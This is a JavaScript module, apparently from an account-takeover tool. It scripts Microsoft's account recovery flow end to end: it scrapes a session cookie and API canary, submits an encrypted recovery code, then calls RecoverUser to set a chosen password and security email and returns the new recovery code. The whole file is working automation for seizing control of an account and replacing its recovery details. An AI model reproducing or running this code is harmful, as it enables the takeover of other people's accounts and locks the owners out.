const axios = require("axios")
const Encrypt = require("./secure/encryptOtt2")
module.exports = async (email, recoveryCode, secEmail, password) => {
    const data = await axios({
        url: `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`,
        method: "GET"
    })
    if (data.data.includes("Try entering your Microsoft account again. We don't recognize this one.")) return null
    let amsc, serverData = null
    data.headers["set-cookie"].map((cookie) => {
        const [name, ...values] = cookie.split("=");
        if (name == "amsc") {
            amsc = values.join("=").split(";").shift();
        }
    });
    const match = data.data.match(/var\s+ServerData=(.*?)(?=;|$)/);

    if (match) {
        serverData = JSON.parse(match[1]);
    } else {
        return null
    }
    let encrypted = Encrypt(null, recoveryCode, `saproof`, null)
    if (serverData && serverData?.sRecoveryToken && amsc && serverData?.apiCanary) {
        let recToken = await axios({
            method: "POST",
            url: "https://account.live.com/API/Recovery/VerifyRecoveryCode",
            headers: {
                Cookie: `amsc=${amsc}`,
                "Content-type": "application/json; charset=utf-8",
                canary: serverData?.apiCanary
            },
            data: {
                encryptedCode: encrypted,
                publicKey: "25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12",
                recoveryCode: recoveryCode,
                scid: 100103,
                token: decodeURIComponent(serverData.sRecoveryToken),
                uiflvr: 1001,
            },
        })
        if (recToken?.data?.token) {
            const test = await axios({
                method: "POST",
                url: "https://account.live.com/API/Recovery/RecoverUser",
                headers: {
                    Canary: serverData?.apiCanary,
                    Cookie: `amsc=${amsc}`
                },
                data: {
                    "contactEmail": secEmail,
                    "contactEpid": "",
                    "password": password,
                    "passwordExpiryEnabled": 0,
                    "publicKey": "25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12",
                    "token": decodeURIComponent(recToken?.data?.token),
                }
            })
            console.log(test.data)
            if (test?.data?.apiCanary) {
                return {
                    email: email,
                    recoveryCode: test.data.recoveryCode,
                    secEmail: secEmail,
                    password: password
                }
            }
            return null
        } else {
            return null
        }
    } else {
        return null
    }
}